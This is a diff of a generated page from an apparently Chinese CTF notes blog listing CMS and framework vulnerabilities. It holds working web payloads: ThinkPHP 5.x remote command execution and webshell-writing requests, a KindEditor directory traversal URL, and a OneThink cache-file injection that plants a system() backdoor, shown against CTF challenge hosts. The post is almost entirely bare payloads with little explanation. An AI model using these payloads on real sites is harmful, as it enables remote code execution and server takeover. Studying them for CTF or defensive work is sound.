@@ -385,7 +385,7 @@ _method=__construct&amp;amp;filter=system&amp;amp;method">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    100
+                    156
                 </div>
                 
 
@@ -412,7 +412,9 @@ _method=__construct&amp;amp;filter=system&amp;amp;method">
 post:
 _method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</code></pre><p>远程执行命令payload(不唯一):</p>
 <pre><code>index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</code></pre><p>写文件payload(不唯一):</p>
-<pre><code>index.php?s=/index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell1.php&amp;vars[1][]=&lt;?phpinfo();?&gt;i</code></pre>
+<pre><code>index.php?s=/index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell1.php&amp;vars[1][]=&lt;?phpinfo();?&gt;i</code></pre><h3 id="kindeditor编辑器的文件目录遍历漏洞"><a href="#kindeditor编辑器的文件目录遍历漏洞" class="headerlink" title="kindeditor编辑器的文件目录遍历漏洞"></a>kindeditor编辑器的文件目录遍历漏洞</h3><pre><code>http://2c0bc5a13a96421a844a8ec8ec3743efc0c7f53181614fcc.changame.ichunqiu.com/kindeditor/php/file_manager_json.php?path=../</code></pre><h3 id="OneThink-CMS的缓存漏洞"><a href="#OneThink-CMS的缓存漏洞" class="headerlink" title="OneThink CMS的缓存漏洞"></a>OneThink CMS的缓存漏洞</h3><pre><code>新建用户
+%0a$a=$_GET[a];#%0asystem($a);#</code></pre><p>记得urldecode<br>然后访问</p>
+<pre><code>http://19640660af614d60879d5f56b41efc7ae9b0ab83ffb74fd0.changame.ichunqiu.com/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=ls</code></pre>
             </div>
             <hr/>
 
@@ -517,32 +519,30 @@ _method=__construct&amp;filter=system&amp;method=get&amp;server[REQUEST_METHOD]=
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/12/04/yu-dao-guo-de-cms-he-kuang-jia-de-lou-dong/">
+                <a href="/2019/12/04/php-nei-he/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="遇到过的cms和框架的漏洞">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="PHP内核">
                         
-                        <span class="card-title">遇到过的cms和框架的漏洞</span>
+                        <span class="card-title">PHP内核</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ThinkPHP 5.0.x、5.1.x、5.2.x 全版本REC(远程命令/代码执行漏洞)index.php?s=captcha
-post:
-_method=__construct&amp;filter=system&amp;method
+                            目前编程语言可以分为两大类:第一类是像C/C++， .NET， Java之类的编译型语言， 它们的共性是: 运行之前必须对源代码进行编译，然后运行编译后的目标文件。
+第二类比如:PHP， Javascript， Ruby， Python这些
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-04
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-12-04
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -555,12 +555,11 @@ _method=__construct&amp;filter=system&amp;method
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
+                    <a href="/tags/PHP/">
+                        <span class="chip bg-color">PHP</span>
                     </a>
                     
                 </div>
@@ -759,7 +758,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">148.8k</span>&nbsp;字
+                class="white-color">150k</span>&nbsp;字
             
             
             
